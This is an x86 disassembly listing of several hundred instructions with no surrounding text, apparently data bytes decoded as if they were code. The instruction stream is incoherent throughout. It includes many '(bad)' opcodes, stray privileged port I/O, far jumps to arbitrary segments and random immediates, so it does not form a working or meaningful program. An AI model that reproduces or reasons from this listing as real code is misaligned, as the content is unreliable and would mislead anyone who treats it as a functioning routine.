  41c92e:	jmp    0x41c951
  41c930:	adc    eax,0x7cf43a7a
  41c935:	mov    ds:0xa55f4a10,eax
  41c93a:	out    dx,eax
  41c93b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c93c:	add    ecx,edi
  41c93e:	(bad)  
  41c93f:	ficom  DWORD PTR [edx+0x7d]
  41c942:	pop    ecx
  41c943:	xchg   ebp,edx
  41c945:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c946:	xchg   edx,eax
  41c947:	xchg   ecx,eax
  41c948:	sub    DWORD PTR [ebx-0x25],eax
  41c94b:	mov    esp,0xe3a7c7e0
  41c950:	pop    esi
  41c951:	dec    esp
  41c952:	jp     0x41c8e5
  41c954:	cmc    
  41c955:	dec    esp
  41c956:	ins    DWORD PTR es:[edi],dx
  41c957:	mov    edi,0xc59f9a10
  41c95c:	cmp    eax,0xc8b8671a
  41c961:	ret    
  41c962:	arpl   WORD PTR [edi],si
  41c964:	jp     0x41c947
  41c966:	jo     0x41c9c9
  41c968:	inc    esp
  41c969:	mov    ds:0x5605b30a,al
  41c96e:	inc    edi
  41c96f:	fcmove st,st(2)
  41c971:	jp     0x41c8fa
  41c973:	adc    al,0xce
  41c975:	enter  0xd83e,0x5c
  41c979:	push   ebp
  41c97a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c97b:	lahf   
  41c97c:	sbb    ebp,DWORD PTR [esi-0x14c72f88]
  41c982:	inc    eax
  41c983:	es mov cl,0xc6
  41c986:	mov    ah,0x4
  41c988:	cmp    ebx,DWORD PTR [ebx+esi*4-0x2d297ec6]
  41c98f:	fldenv [ebx-0x5d]
  41c992:	and    al,0xfa
  41c994:	mov    esp,0x10226859
  41c999:	nop
  41c99a:	int3   
  41c99b:	fiadd  WORD PTR [edx-0x618577d9]
  41c9a1:	fst    DWORD PTR [ecx+esi*1-0x3e3c69fb]
  41c9a8:	mov    ch,0x1d
  41c9aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c9ab:	jns    0x41ca01
  41c9ad:	push   ebx
  41c9ae:	ins    BYTE PTR es:[edi],dx
  41c9af:	mov    esp,0x8272de0a
  41c9b4:	lock adc ecx,esp
  41c9b7:	out    dx,eax
  41c9b8:	cmp    edx,DWORD PTR [ebp+0xda5a150]
  41c9be:	imul   ebp,DWORD PTR [ebp+0x47e92b6e],0x75
  41c9c5:	push   ebx
  41c9c6:	stos   DWORD PTR es:[edi],eax
  41c9c7:	lahf   
  41c9c8:	fbstp  TBYTE PTR ds:0xd2ab5587
  41c9ce:	and    al,0xd5
  41c9d0:	cmp    edi,DWORD PTR [eax+0x77]
  41c9d3:	(bad)  
  41c9d4:	mov    ds:0x371f40fe,eax
  41c9d9:	sbb    BYTE PTR [ecx+0x2b],0xd5
  41c9dd:	aaa    
  41c9de:	clc    
  41c9df:	sbb    eax,0xe7903cde
  41c9e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c9e5:	popf   
  41c9e6:	fucomi st,st(2)
  41c9e8:	jno    0x41c9c2
  41c9ea:	gs ret 
  41c9ec:	dec    esi
  41c9ed:	ins    BYTE PTR es:[edi],dx
  41c9ee:	jmp    DWORD PTR [edi-0x725827fb]
  41c9f4:	loop   0x41c9a0
  41c9f6:	movaps XMMWORD PTR [ecx],xmm0
  41c9f9:	test   cl,0x26
  41c9fc:	test   DWORD PTR [ecx+0x4f41db68],0x507f56e1
  41ca06:	jp     0x41c98e
  41ca08:	mov    esi,0x647790de
  41ca0d:	(bad)  
  41ca0f:	mov    edx,0xfba40d08
  41ca14:	xor    al,0xf9
  41ca16:	inc    esp
  41ca17:	sbb    al,0x1a
  41ca19:	popa   
  41ca1a:	lods   al,BYTE PTR ds:[esi]
  41ca1b:	mov    ah,0x92
  41ca1d:	add    DWORD PTR [ecx-0x3e534d2c],ebp
  41ca23:	stos   DWORD PTR es:[edi],eax
  41ca24:	xchg   edi,eax
  41ca25:	dec    eax
  41ca26:	ss dec ecx
  41ca28:	add    al,bl
  41ca2a:	test   ebp,ecx
  41ca2c:	dec    esp
  41ca2d:	ins    DWORD PTR es:[edi],dx
  41ca2e:	xor    eax,DWORD PTR [ebp+0x5c]
  41ca31:	sbb    BYTE PTR [esi],al
  41ca33:	loop   0x41ca9e
  41ca35:	jmp    0xab925afd
  41ca3a:	jg     0x41ca3a
  41ca3c:	jmp    0xa2e8:0x747166a5
  41ca43:	xchg   dh,ch
  41ca45:	inc    ecx
  41ca46:	cmp    edx,DWORD PTR ds:0x974edc00
  41ca4c:	aad    0xb5
  41ca4e:	retf   
  41ca4f:	jecxz  0x41ca9f
  41ca51:	cld    
  41ca52:	cmp    eax,0x7a25176a
  41ca57:	mov    esi,0x9e91d4de
  41ca5c:	les    ecx,FWORD PTR [eax+ebx*1+0x4d]
  41ca60:	test   DWORD PTR [esi-0x759b7f1c],ecx
  41ca66:	jp     0x41cae3
  41ca68:	shl    ecx,cl
  41ca6a:	dec    DWORD PTR [ecx]
  41ca6c:	mov    al,ds:0x643da241
  41ca71:	inc    edi
  41ca72:	cmp    al,0x38
  41ca74:	sub    BYTE PTR [esi],0xfb
  41ca77:	xor    al,0xb4
  41ca79:	cmp    BYTE PTR [esi],al
  41ca7b:	retf   
  41ca7c:	xchg   edi,eax
  41ca7d:	push   0x629e7922
  41ca82:	mov    ebx,0xe8b900b2
  41ca87:	xchg   BYTE PTR [edi+0x2b7125e9],bl
  41ca8d:	(bad)  
  41ca8f:	fs ins BYTE PTR es:[edi],dx
  41ca91:	add    eax,0x8aae572a
  41ca96:	shl    DWORD PTR [esi-0x61],1
  41ca99:	out    dx,al
  41ca9a:	mov    esi,0xa00c0d3c
  41ca9f:	or     BYTE PTR [ecx],dh
  41caa1:	test   eax,eax
  41caa3:	push   ecx
  41caa4:	and    edx,eax
  41caa6:	loope  0x41cb22
  41caa8:	cmp    DWORD PTR [eax],esi
  41caaa:	push   ebx
  41caab:	sbb    al,0x19
  41caad:	xchg   DWORD PTR [ebx-0x7f],eax
  41cab0:	xor    ecx,DWORD PTR [ecx]
  41cab2:	cmp    BYTE PTR ds:0x785d9904,0x82
  41cab9:	and    ch,BYTE PTR [edi+0x3d589aad]
  41cabf:	(bad)  
  41cac1:	xchg   esp,eax
  41cac2:	idiv   DWORD PTR [ebx]
  41cac4:	inc    eax
  41cac5:	adc    edx,edi
  41cac7:	ja     0x41cad5
  41cac9:	out    0x4e,eax
  41cacb:	fcmovbe st,st(1)
  41cacd:	jo     0x41ca8a
  41cacf:	sub    bl,ch
  41cad1:	adc    al,0x59
  41cad3:	pop    ss
  41cad4:	call   0x42a13bc4
  41cad9:	mov    ch,0xb2
  41cadb:	sub    bl,ah
  41cadd:	call   0x25d:0x1935e53f
  41cae4:	mov    fs,WORD PTR [ebp+edx*2-0x79]
  41cae8:	dec    ebp
  41cae9:	jnp    0x41cb28
  41caeb:	xor    al,0x54
  41caed:	jle    0x41cb6b
  41caef:	stos   DWORD PTR es:[edi],eax
  41caf0:	sub    esp,DWORD PTR [edx-0xdf17415]
  41caf6:	adc    ecx,ebx
  41caf8:	xor    DWORD PTR [esi-0x5142e910],edi
  41cafe:	cmp    ch,BYTE PTR [edi]
  41cb00:	popw   ds
  41cb02:	mov    ?,WORD PTR [edx]
  41cb04:	in     al,dx
  41cb05:	push   edi
  41cb06:	xchg   DWORD PTR ds:0x3f37cd2b,ecx
  41cb0c:	cmp    eax,0x74b78178
  41cb11:	mov    eax,ds:0x3169bf6e
  41cb16:	inc    ebx
  41cb17:	mov    ebx,0x8fc5f417
  41cb1c:	xor    eax,0x373de136
  41cb21:	pop    ecx
  41cb22:	xor    DWORD PTR [edi],esi
  41cb24:	rcl    DWORD PTR ds:0xcc5a4692,1
  41cb2a:	dec    esp
  41cb2b:	dec    ebp
  41cb2c:	mov    edi,0x7b5a7d7a
  41cb31:	mov    ah,0xa4
  41cb33:	sti    
  41cb34:	push   edi
  41cb35:	aaa    
  41cb36:	xchg   esp,eax
  41cb37:	or     eax,0x2a27cc21
  41cb3c:	jb     0x41cb3c
  41cb3e:	dec    ebx
  41cb3f:	int3   
  41cb40:	sub    al,0xa0
  41cb42:	inc    ebx
  41cb43:	add    dh,ah
  41cb45:	or     ch,0xd9
  41cb48:	fisubr DWORD PTR [ecx-0x36]
  41cb4b:	xlat   BYTE PTR ds:[ebx]
  41cb4c:	out    dx,al
  41cb4d:	jmp    0x41cbad
  41cb4f:	inc    ecx
  41cb50:	mov    ebp,0xb261b6c7
  41cb55:	cmc    
  41cb56:	dec    eax
  41cb57:	or     eax,0x87db4a71
  41cb5c:	out    dx,al
  41cb5d:	jge    0x41cba2
  41cb5f:	pop    edi
  41cb60:	xchg   edi,eax
  41cb61:	pusha  
  41cb62:	imul   esi,DWORD PTR [eax-0x3e],0x6f0484d0
  41cb69:	sar    dl,0x6
  41cb6c:	jne    0x41cbe5
  41cb6e:	imul   edi,DWORD PTR [ebp+0x2d68051e],0x7f1c2a65
  41cb78:	cdq    
  41cb79:	or     al,0x60
  41cb7b:	repnz mov dl,0xbc
  41cb7e:	add    esp,DWORD PTR ss:[edx+0x76cfa28d]
  41cb85:	or     ecx,eax
  41cb87:	scas   eax,DWORD PTR es:[edi]
  41cb88:	in     eax,dx
  41cb89:	ins    DWORD PTR es:[edi],dx
  41cb8a:	je     0x41cb84
  41cb8c:	jne    0x41cb27
  41cb8e:	fnstsw ax
  41cb90:	cld    
  41cb91:	stos   DWORD PTR es:[edi],eax
  41cb92:	test   al,0xab
  41cb94:	call   0xa471db58
  41cb99:	sub    eax,0x99de78cb
  41cb9e:	sub    al,0xf4
  41cba0:	popa   
  41cba1:	jns    0x41cb9b
  41cba3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cba4:	or     ecx,0x61b4b8f
  41cbaa:	add    BYTE PTR [edx-0x7a373110],bl
  41cbb0:	mov    ebx,0xb02cbd06
  41cbb5:	push   es
  41cbb6:	add    DWORD PTR ss:[ebp+0x2f707d56],0xffffffbf
  41cbbe:	sub    dl,ah
  41cbc0:	xchg   ebp,eax
  41cbc1:	dec    esi
  41cbc2:	inc    esp
  41cbc3:	in     al,0x6c
  41cbc5:	loope  0x41cb53
  41cbc7:	mov    ebp,0x213d4396
  41cbcc:	cmp    esi,DWORD PTR [edi+0x8ad634b]
  41cbd2:	pop    edi
  41cbd3:	test   DWORD PTR [esp+ebx*4-0x46],eax
  41cbd7:	ror    bl,1
  41cbd9:	adc    DWORD PTR [eax-0x73491209],ebx
  41cbdf:	dec    esi
  41cbe0:	test   DWORD PTR [ebp+0x3c],ebp
  41cbe3:	out    0x21,eax
  41cbe5:	push   cs
  41cbe6:	cld    
  41cbe7:	rol    esp,0xe1
  41cbea:	jae    0x41cc30
  41cbec:	gs xchg ebp,eax
  41cbee:	add    BYTE PTR [ecx],bl
  41cbf0:	adc    DWORD PTR [ebp+ecx*2+0x7d],edi
  41cbf4:	mov    ah,0x3c
  41cbf6:	call   0x8b4d:0x4d27838e
  41cbfd:	mov    ds:0xb4012c8f,eax
  41cc02:	jecxz  0x41cbbe
  41cc04:	dec    ebp
  41cc05:	pop    es
  41cc06:	inc    edi
  41cc07:	cli    
  41cc08:	(bad)  
  41cc09:	cli    
  41cc0a:	(bad)  
  41cc0b:	out    0xca,al
  41cc0d:	into   
  41cc0e:	das    
  41cc0f:	jae    0x41cc7e
  41cc11:	out    dx,al
  41cc12:	sbb    ebx,0x36
  41cc15:	pop    eax
  41cc16:	fwait
  41cc17:	or     BYTE PTR [ecx],ch
  41cc19:	outs   dx,DWORD PTR ds:[esi]
  41cc1a:	lods   al,BYTE PTR ds:[esi]
  41cc1b:	sub    DWORD PTR [eax+0x15],ecx
  41cc1e:	clc    
  41cc1f:	bound  ecx,QWORD PTR [ecx-0x37]
  41cc22:	mov    edx,0x9c07172c
  41cc27:	ja     0x41cbf2
  41cc29:	loope  0x41cbe5
  41cc2b:	js     0x41cc4e
  41cc2d:	and    eax,0x333002dc
  41cc32:	inc    esi
  41cc33:	test   eax,edi
  41cc35:	cwde   
  41cc36:	adc    eax,0xf2a3d39e
  41cc3b:	clc    
  41cc3c:	iret   
  41cc3d:	dec    edi
  41cc3e:	and    al,0x29
  41cc40:	into   
  41cc41:	inc    eax
  41cc42:	adc    ebx,eax
  41cc44:	and    eax,0x7d3b2cc9
  41cc49:	ja     0x41cca4
  41cc4b:	rcl    dh,0xb1
  41cc4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cc4f:	mov    dh,0xc5
  41cc51:	cli    
  41cc52:	mov    ds:0x571b3cc9,al
  41cc57:	mov    ebx,0x445d8cb
  41cc5c:	mov    dl,0x67
  41cc5e:	mov    edx,0x19cd872f
  41cc63:	mov    esi,0x98d1a1d
  41cc68:	xchg   esi,eax
  41cc69:	add    eax,0xf4fee09c
  41cc6e:	lock dec edx
  41cc70:	adc    edi,DWORD PTR [ecx+ebp*4]
  41cc73:	out    0x18,eax
  41cc75:	pop    ecx
  41cc76:	test   BYTE PTR [edi+0x222cc096],dh
  41cc7c:	(bad)  
  41cc7d:	pop    sp
  41cc7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cc80:	inc    esi
  41cc81:	pextrw ebp,(bad),0xc5
  41cc83:	ins    DWORD PTR es:[edi],dx
  41cc84:	cmp    DWORD PTR [ebx-0x643d4d9d],0xffffff9e
  41cc8b:	iret   
  41cc8c:	pop    ecx
  41cc8d:	call   0x529e1fec
  41cc92:	mov    edi,0xf999d332
  41cc97:	scas   al,BYTE PTR es:[edi]
  41cc98:	popf   
  41cc99:	cmp    eax,esp
  41cc9b:	push   ds
  41cc9c:	pop    esi
  41cc9d:	inc    esp
  41cc9e:	add    esi,edi
  41cca0:	xor    DWORD PTR [ebx-0x4f97e76],ecx
  41cca6:	pop    ecx
  41cca7:	mov    ds:0x8a243e65,eax
  41ccac:	ja     0x41cccb
  41ccae:	xchg   edx,eax
  41ccaf:	idiv   BYTE PTR [esi+0x36]
  41ccb2:	xchg   edx,eax
  41ccb3:	je     0x41ccb4
  41ccb5:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ccb7:	fimul  DWORD PTR [esi]
  41ccb9:	sub    BYTE PTR [ecx+0x3f],ch
  41ccbc:	mul    DWORD PTR [edx-0x3282c641]
  41ccc2:	sbb    ah,BYTE PTR ds:0x4068df0c
  41ccc8:	cmp    bl,BYTE PTR [eax+0x4]
  41cccb:	gs pop esi
  41cccd:	clc    
  41ccce:	pop    esp
  41cccf:	dec    ecx
  41ccd0:	(bad)  
  41ccd2:	imul   edx,DWORD PTR [ebp+0x5f15621f],0xffffffaf
  41ccd9:	jns    0x41cc69
  41ccdb:	sahf   
  41ccdc:	mul    BYTE PTR [esi*8+0x7e093b04]
  41cce3:	(bad)  
  41cce4:	retf   
  41cce5:	out    dx,al
  41cce6:	test   DWORD PTR [ecx+0x0],esi
  41cce9:	jmp    0x41cd22
  41cceb:	xor    eax,0x475dc8d2
  41ccf0:	ss inc esp
  41ccf2:	sbb    eax,0xacd594ef
  41ccf7:	lock test DWORD PTR [edx-0x6a],ecx
  41ccfb:	aas    
  41ccfc:	sti    
  41ccfd:	cs cmc 
  41ccff:	stos   BYTE PTR es:[edi],al
  41cd00:	lods   al,BYTE PTR ds:[esi]
  41cd01:	pop    ss
  41cd02:	pop    esp
  41cd03:	inc    esi
  41cd04:	xchg   esi,eax
  41cd05:	cli    
  41cd06:	or     bl,BYTE PTR [ecx]
  41cd08:	loopne 0x41cd01
  41cd0a:	test   BYTE PTR [ebp-0x523032e6],0x67
  41cd11:	pop    ds
  41cd12:	hlt    
  41cd13:	mov    ds:0xbd08f948,al
  41cd18:	dec    edi
  41cd19:	mov    ah,0xaf
  41cd1b:	mov    eax,0xf9210cde
  41cd20:	popf   
  41cd21:	rol    BYTE PTR [esi],1
  41cd23:	jmp    0x19f7:0x68c016a8
  41cd2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cd2b:	xchg   ecx,eax
  41cd2c:	dec    ecx
  41cd2d:	pop    ebp
  41cd2e:	and    cl,bl
  41cd30:	imul   edx,ebp,0xffffffc0
  41cd33:	push   ss
  41cd34:	inc    esi
  41cd35:	lods   al,BYTE PTR ds:[esi]
  41cd36:	out    dx,al
  41cd37:	stc    
  41cd38:	xor    BYTE PTR [esi-0x1a],dl
  41cd3b:	jne    0x41cd61
  41cd3d:	pushf  
  41cd3e:	mov    bl,0xb8
  41cd40:	or     ebx,DWORD PTR [esi-0x74]
  41cd43:	adc    bh,BYTE PTR [esi+ebp*8]
  41cd46:	arpl   WORD PTR [edx],bx
  41cd48:	popa   
  41cd49:	xlat   BYTE PTR ds:[ebx]
  41cd4a:	mov    dl,bh
  41cd4c:	mov    ebp,0x3e56d838
  41cd51:	pop    ss
  41cd52:	clc    
  41cd53:	mov    edi,0xe81fcfe3
  41cd58:	fisttp QWORD PTR gs:[eax-0x1729fca9]
  41cd5f:	sub    al,0xc3
  41cd61:	jmp    0x82e5:0x715e9286
  41cd68:	gs mov ebp,esp
  41cd6b:	cmc    
  41cd6c:	bnd jl 0x41cdd8
  41cd6f:	xchg   esi,eax
  41cd70:	inc    ebp
  41cd71:	jg     0x41cd69
  41cd73:	pop    edi
  41cd74:	das    
  41cd75:	jo     0x41cd73
  41cd77:	loope  0x41cd94
  41cd79:	call   0x3f01:0x5d567ea2
  41cd80:	xlat   BYTE PTR ds:[ebx]
  41cd81:	pop    ebx
  41cd82:	enter  0x1656,0x43
  41cd86:	in     al,dx
  41cd87:	jge    0x41cd75
  41cd89:	test   eax,0xe8e00ca0
  41cd8e:	repnz (bad) 
  41cd90:	ret    
  41cd91:	add    dh,cl
  41cd93:	je     0x41cd55
  41cd95:	mov    ch,0x86
  41cd97:	aam    0x46
  41cd99:	lahf   
  41cd9a:	jns    0x41cde0
  41cd9c:	dec    ecx
  41cd9d:	das    
  41cd9e:	dec    edi
  41cd9f:	push   cs
  41cda0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cda1:	sub    eax,0xef575507
  41cda6:	shl    DWORD PTR [edx],1
  41cda8:	push   cs
  41cda9:	cmp    bh,cl
  41cdab:	add    eax,0x331d7782
  41cdb0:	iret   
  41cdb1:	int    0x75
  41cdb3:	or     bl,cl
  41cdb5:	add    edx,0xa431ab94
  41cdbb:	lahf   
  41cdbc:	test   DWORD PTR [edi-0x4b],0xc6416942
  41cdc3:	cdq    
  41cdc4:	jecxz  0x41cdd6
  41cdc6:	xor    ch,BYTE PTR [ebp-0x5d8cac0f]
  41cdcc:	xor    esp,esp
  41cdce:	inc    ecx
  41cdcf:	test   bh,bh
  41cdd1:	mov    edi,0xb48286ae
  41cdd6:	cld    
  41cdd7:	aad    0x7e
  41cdd9:	add    al,0x5a
  41cddb:	pop    ss
  41cddc:	mov    ecx,DWORD PTR ds:0xaf07af2b
  41cde2:	adc    al,0x1
  41cde4:	push   0x22b2e6e5
  41cde9:	pop    ecx
  41cdea:	sub    DWORD PTR [edi+0x80cea10],ecx
  41cdf0:	xor    eax,0x12ade579
  41cdf5:	xchg   edi,eax
  41cdf6:	cli    
  41cdf7:	leave  
  41cdf8:	addr16 icebp 
  41cdfa:	xchg   edi,eax
  41cdfb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cdfc:	ds into 
  41cdfe:	jge    0x41cd88
  41ce00:	js     0x41ce47
  41ce02:	lock and esi,ecx
  41ce05:	enter  0xbc4b,0xc8
  41ce09:	dec    edi
  41ce0a:	dec    esp
  41ce0b:	and    DWORD PTR [ebx+eax*8],esp
  41ce0e:	popf   
  41ce0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ce10:	sub    DWORD PTR [ecx+0x79],ebx
  41ce13:	aam    0xc1
  41ce15:	(bad)  
  41ce16:	dec    esi
  41ce17:	pushf  
  41ce18:	in     eax,0xc2
  41ce1a:	adc    al,0x1
  41ce1c:	fcmovb st,st(1)
  41ce1e:	inc    ebp
  41ce1f:	shr    BYTE PTR [ecx-0xa],1
  41ce22:	lea    eax,[esi-0x29]
  41ce25:	dec    esp
  41ce26:	outs   dx,BYTE PTR ds:[esi]
  41ce27:	cmp    ch,ch
  41ce29:	adc    DWORD PTR [esi],0x23c81507
  41ce2f:	pusha  
  41ce30:	cmp    edi,ebx
  41ce32:	ret    
  41ce33:	sbb    dl,ah
  41ce35:	popf   
  41ce36:	inc    esi
  41ce37:	pop    esp
  41ce38:	add    eax,DWORD PTR [ebp+0x6da2aa51]
  41ce3e:	sbb    eax,0xfc2f37f7
  41ce43:	enter  0xc9ba,0x47
  41ce47:	dec    ecx
  41ce48:	(bad)  
  41ce49:	or     al,0x56
  41ce4b:	das    
  41ce4c:	xchg   ecx,eax
  41ce4d:	cli    
  41ce4e:	pushf  
  41ce4f:	shl    BYTE PTR [edx],0xa2
  41ce52:	into   
  41ce53:	jge    0x41ce9f
  41ce55:	adc    dl,BYTE PTR [eax+0x51]
  41ce58:	push   ds
  41ce59:	mov    ecx,0x4d5fc8b9
  41ce5e:	mov    cl,dl
  41ce60:	repnz out dx,al
  41ce62:	ins    BYTE PTR es:[edi],dx
  41ce63:	ss popf 
  41ce65:	fisubr WORD PTR [ebp-0x52]
  41ce68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ce69:	fs sub edx,esi
  41ce6c:	add    dl,BYTE PTR [edi+0x70ee2d2d]
  41ce72:	pushf  
  41ce73:	or     eax,DWORD PTR [ebx-0x67]
  41ce76:	xchg   ecx,eax
  41ce77:	test   al,0x40
  41ce79:	aaa    
  41ce7a:	gs rcr ebx,1
  41ce7d:	les    eax,FWORD PTR [eax+0x3c97c19e]
  41ce83:	or     al,0x2b
  41ce85:	outs   dx,DWORD PTR ds:[esi]
  41ce86:	(bad)  
  41ce88:	fadd   QWORD PTR [edi-0x34]
  41ce8b:	popf   
  41ce8c:	dec    edi
  41ce8d:	sbb    eax,0xbef9fe20
  41ce92:	das    
  41ce93:	je     0x41ce6f
  41ce95:	pusha  
  41ce96:	les    esp,FWORD PTR [ebp-0x51]
  41ce99:	mov    esi,0xbf7db907
  41ce9e:	out    0x43,eax
  41cea0:	pop    ds
  41cea1:	scas   eax,DWORD PTR es:[edi]
  41cea2:	jle    0x41ceb5
  41cea4:	pop    edi
  41cea5:	mov    bl,0x74
  41cea7:	jo     0x41ceb8
  41cea9:	sti    
  41ceaa:	call   0x125b:0x7be4bb43
  41ceb1:	pop    esi
  41ceb2:	push   eax
  41ceb3:	(bad)  
  41ceb4:	jne    0x41cee6
  41ceb6:	pop    edi
  41ceb7:	jg     0x41ce73
  41ceb9:	test   al,0x1c
  41cebb:	imul   ebp,esi,0x58e6d4a
  41cec1:	jle    0x41cee4
  41cec3:	and    bl,BYTE PTR [edx-0x5b]
  41cec6:	ficomp WORD PTR [edi+0x65ea7e65]
  41cecc:	gs mov eax,0x4958bd71
  41ced2:	aaa    
  41ced3:	inc    esp
  41ced4:	stos   DWORD PTR es:[edi],eax
  41ced5:	loopne 0x41ced6
  41ced7:	aas    
  41ced8:	(bad)  
  41ced9:	sbb    al,0x3
  41cedb:	repnz out dx,eax
  41cedd:	add    ah,BYTE PTR [ebp-0x483cbd68]
  41cee3:	or     ebx,eax
  41cee5:	popa   
  41cee6:	ss scas al,BYTE PTR es:[edi]
  41cee8:	out    0x97,al
  41ceea:	test   eax,0xd839b528
  41ceef:	mov    esp,0xe97e7005
  41cef4:	push   ebp
  41cef5:	xchg   edi,eax
  41cef6:	(bad)  
  41cef7:	adc    DWORD PTR [ecx+eiz*2-0x16],ecx
  41cefb:	shl    dh,1
  41cefd:	into   
  41cefe:	dec    esi
  41ceff:	and    eax,0xb04053c0
  41cf04:	cmc    
  41cf05:	xor    al,0xf5
  41cf07:	add    bh,BYTE PTR [ebp+0x167d8b0c]
  41cf0d:	mov    cl,0x51
  41cf0f:	sub    esp,DWORD PTR cs:[ecx+0x68ed9bd9]
  41cf16:	sbb    eax,0xa4018a8a
  41cf1b:	adc    eax,0xfee9095f
  41cf20:	cmc    
  41cf21:	loope  0x41cf33
  41cf23:	fcmovu st,st(1)
  41cf25:	mov    esp,0x4a094386
  41cf2a:	push   esi
  41cf2b:	popa   
  41cf2c:	mov    eax,0x2a58cf54
  41cf31:	ds pop ds
  41cf33:	arpl   WORD PTR [ebx],bp
  41cf35:	adc    dl,al
  41cf37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cf38:	fst    DWORD PTR [ecx]
  41cf3a:	clc    
  41cf3b:	lock pop es
  41cf3d:	sbb    al,0x21
  41cf3f:	mov    dh,0x52
  41cf41:	mov    ecx,0x27172b86
  41cf46:	lock push esi
  41cf48:	icebp  
  41cf49:	fisubr DWORD PTR [esi-0x22e80927]
  41cf4f:	xor    eax,0xd0d0d7c7
  41cf54:	xor    cl,0xec
  41cf57:	jbe    0x41cee9
  41cf59:	or     BYTE PTR [ebp+ebx*2-0x71],dl
  41cf5d:	aad    0x90
  41cf5f:	(bad)  [edi+0x2c45449a]
  41cf65:	ins    BYTE PTR es:[di],dx
  41cf67:	push   edi
  41cf68:	inc    esi
  41cf69:	mov    eax,0xa148b64
  41cf6e:	bnd jno 0x41cf68
  41cf71:	dec    edx
  41cf72:	imul   edi,DWORD PTR [eax+ebx*1+0xfc0ac52],0x88f84059
  41cf7d:	pop    eax
  41cf7e:	jle    0x41cfff
  41cf80:	lahf   
  41cf81:	xchg   edi,eax
  41cf82:	iret   
  41cf83:	addr16 popa 
  41cf85:	jg     0x41cf23
  41cf87:	les    edx,FWORD PTR [eax+esi*8]
  41cf8a:	cwde   
  41cf8b:	sub    al,0x76
  41cf8d:	fisttp QWORD PTR [ecx-0x74]
  41cf90:	sub    DWORD PTR [edx-0x5d],ebx
  41cf93:	jne    0x41cfae
  41cf95:	rcr    BYTE PTR [edi],0x3e
  41cf98:	sub    dh,BYTE PTR [ecx-0x23]
  41cf9b:	cmp    ah,BYTE PTR [eax+0x20]
  41cf9e:	xchg   edx,eax
  41cf9f:	add    BYTE PTR [edi+0x7226fee4],dh
  41cfa5:	stc    
  41cfa6:	ja     0x41cf59
  41cfa8:	inc    edi
  41cfa9:	das    
  41cfaa:	pop    ds
  41cfab:	add    edx,DWORD PTR gs:[edi+0x12c8b8f1]
  41cfb2:	hlt    
  41cfb3:	cwde   
  41cfb4:	ins    DWORD PTR es:[edi],dx
  41cfb5:	rcr    bl,0xb4
  41cfb8:	and    BYTE PTR [ecx+eiz*2],ch
  41cfbb:	ins    DWORD PTR es:[edi],dx
  41cfbc:	push   eax
  41cfbd:	ss retf 0xea8a
  41cfc1:	imul   ecx,DWORD PTR [ebx+edx*2],0xcaa8fda5
  41cfc8:	pop    es
  41cfc9:	ret    
  41cfca:	in     al,0x5a
  41cfcc:	sub    al,0x32
  41cfce:	push   esi
  41cfcf:	sub    esp,eax
  41cfd1:	mov    bl,0x1b
  41cfd3:	adc    al,0xf1
  41cfd5:	lmsw   WORD PTR [edx]
  41cfd8:	pop    ds
  41cfd9:	sar    BYTE PTR [eax+0x7a],1
  41cfdc:	fist   WORD PTR [edx+0x42]
  41cfdf:	test   BYTE PTR [esi],dh
  41cfe1:	aad    0x83
  41cfe3:	push   es
  41cfe4:	pop    es
  41cfe5:	mov    bh,0xaf
  41cfe7:	pushf  
  41cfe8:	xchg   esi,eax
  41cfe9:	(bad)  
  41cfeb:	and    DWORD PTR [ecx],ecx
  41cfed:	rcr    BYTE PTR [edi+0x23],cl
  41cff0:	fldl2e 
  41cff2:	adc    BYTE PTR [esp+edx*8],dh
  41cff5:	icebp  
  41cff6:	jnp    0x41cfdc
  41cff8:	test   DWORD PTR ds:0x1934fab3,ebx
  41cffe:	int    0x16
  41d000:	mov    ds:0x5bee4ec8,eax
  41d005:	push   0xa6011051
  41d00a:	popf   
  41d00b:	dec    edx
  41d00c:	adc    DWORD PTR [ecx+0x1f5d8c77],esi
  41d012:	out    0x93,al
  41d014:	ret    
  41d015:	sahf   
  41d016:	or     al,dl
  41d018:	ja     0x41cfd1
  41d01a:	sbb    al,0xf9
  41d01c:	hlt    
  41d01d:	or     dl,BYTE PTR [edi]
  41d01f:	(bad)  
  41d021:	mov    ebp,0x427c8ba9
  41d026:	sub    eax,0x9ae197e0
  41d02b:	nop
  41d02c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d02d:	stc    
  41d02e:	mov    eax,ds:0x6df4fc
  41d033:	bnd jbe 0x41d095
  41d036:	fwait
  41d037:	pop    esi
  41d038:	mov    esp,eax
  41d03a:	jecxz  0x41d048
  41d03c:	cwde   
  41d03d:	ret    
  41d03e:	xor    al,0x80
  41d040:	shl    DWORD PTR ds:0xf97d3182,0x0
  41d047:	xchg   ebx,eax
  41d048:	xor    DWORD PTR [ebx+0x3e275ce],esp
  41d04e:	shr    BYTE PTR [edx-0x45],0x70
  41d052:	push   ebx
  41d053:	inc    ecx
  41d054:	repnz pop ds
  41d056:	and    ebx,DWORD PTR [edx-0x44ab737b]
  41d05c:	mov    ebp,0x35a6da3b
  41d061:	mov    dl,dh
  41d063:	push   ebp
  41d064:	jb     0x41d09a
  41d066:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d067:	add    DWORD PTR [esi],esi
  41d069:	add    DWORD PTR [eax+0x68],0xffffff9e
  41d06d:	sub    al,0x95
  41d06f:	in     eax,dx
  41d070:	adc    edx,ebx
  41d072:	jo     0x41d09b
  41d074:	jb     0x41d061
  41d076:	xor    esp,ecx
  41d078:	arpl   WORD PTR [ebx],cx
  41d07a:	inc    esi
  41d07b:	daa    
  41d07c:	jmp    0x41d0ae
